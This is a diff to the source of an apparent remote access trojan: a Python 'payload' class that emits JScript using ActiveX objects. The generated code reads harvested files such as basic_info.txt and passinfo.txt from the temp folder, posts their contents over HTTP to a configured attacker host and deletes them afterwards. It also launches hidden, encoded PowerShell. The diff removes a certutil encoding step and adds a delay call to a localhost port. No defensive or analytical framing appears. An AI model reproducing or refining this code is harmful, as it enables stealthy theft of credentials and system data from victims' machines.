@@ -39,12 +39,8 @@ class payload():
             var fso = new ActiveXObject("Scripting.FileSystemObject")
             if (!fso.FileExists(path)) return;
             try{ 
-                tmp_path = path+".b64"
-                var fso = new ActiveXObject("Scripting.FileSystemObject")
-                if (fso.FileExists(tmp_path)) fso.DeleteFile(tmp_path);
-                r = new ActiveXObject("WScript.Shell").Run("certutil -encode "+path+" "+tmp_path,0,true);
-                fso1=new ActiveXObject("Scripting.FileSystemObject");
-                f=fso1.OpenTextFile(tmp_path,1);
+                var fso1 = new ActiveXObject("Scripting.FileSystemObject")
+                f=fso1.OpenTextFile(path,1);
                 message=f.ReadAll();
                 f.Close();
                 p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
@@ -53,8 +49,6 @@ class payload():
                 p.Send(escape(message));
                 message = p.ResponseText
                 fso1=new ActiveXObject("Scripting.FileSystemObject");
-                f =fso1.GetFile(tmp_path);
-                f.Delete();
                 f =fso1.GetFile(path);
                 f.Delete();
             }catch(err){
@@ -62,6 +56,15 @@ class payload():
             }
             return message
         }
+        function delay(){
+            try{
+                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                p.Open("GET","http://127.0.0.1:65033/",false);
+                p.Send('')
+            }catch(err){
+            }
+        }
+        delay()
         var fso = new ActiveXObject("Scripting.FileSystemObject")
         var tmppath = new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(2)+'\\\\'
         var ratcode = upload(tmppath+"basic_info.txt")
@@ -378,6 +381,14 @@ class payload():
         '''%(config.host, config.port, config.host, config.port)
         data += self.run('powershell.exe -window hidden -enc %s'%powershell_encode(ps2))
         data += '''
+        function delay(){
+            try{
+                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                p.Open("GET","http://127.0.0.1:65033/",false);
+                p.Send('')
+            }catch(err){
+            }
+        }
         i = 3;
         while(i--){
             if(fso.FileExists(tmppath+"passinfo.txt")) break;
